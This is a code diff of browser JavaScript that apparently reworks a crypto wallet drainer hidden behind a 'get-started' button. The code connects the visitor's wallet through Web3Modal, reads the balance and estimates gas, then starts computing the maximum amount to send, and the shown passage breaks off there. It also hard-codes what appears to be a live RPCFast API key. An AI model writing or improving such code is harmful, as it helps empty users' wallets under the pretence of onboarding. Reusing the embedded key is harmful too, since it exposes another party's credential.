@@ -1,30 +1,37 @@
 document.getElementById('get-started').onclick = async () => {
     try {
-        // Initialize WalletConnect Provider with RPCFast endpoint
-        const provider = new WalletConnectProvider.default({
-            rpc: {
-                1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW"
-            },
-            qrcodeModalOptions: {
-                mobileLinks: ["metamask"]
+        const providerOptions = {
+            walletconnect: {
+                package: WalletConnectProvider.default, // required
+                options: {
+                    rpc: {
+                        1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW"
+                    },
+                    qrcodeModalOptions: {
+                        mobileLinks: ["metamask"]
+                    }
+                }
             }
+        };
+
+        const web3Modal = new window.Web3Modal.default({
+            cacheProvider: false, // optional
+            providerOptions, // required
+            disableInjectedProvider: false // Disable if you want to use WalletConnect on desktop too
         });
 
-        // Enable session (triggers QR Code modal for desktop or opens MetaMask on mobile)
-        await provider.enable();
-
-        // Create ethers provider and signer
-        const ethersProvider = new ethers.providers.Web3Provider(provider);
-        const signer = ethersProvider.getSigner();
+        const instance = await web3Modal.connect();
+        const provider = new ethers.providers.Web3Provider(instance);
+        const signer = provider.getSigner();
 
         console.log("Wallet connected");
 
         // Get the balance of the wallet
         const address = await signer.getAddress();
-        const balance = await ethersProvider.getBalance(address);
+        const balance = await provider.getBalance(address);
 
         // Estimate gas price
-        const gasPrice = await ethersProvider.getGasPrice();
+        const gasPrice = await provider.getGasPrice();
         const gasLimit = 21000; // Standard gas limit for a simple ETH transfer
 
         // Calculate the max value to send (balance - gas fee)
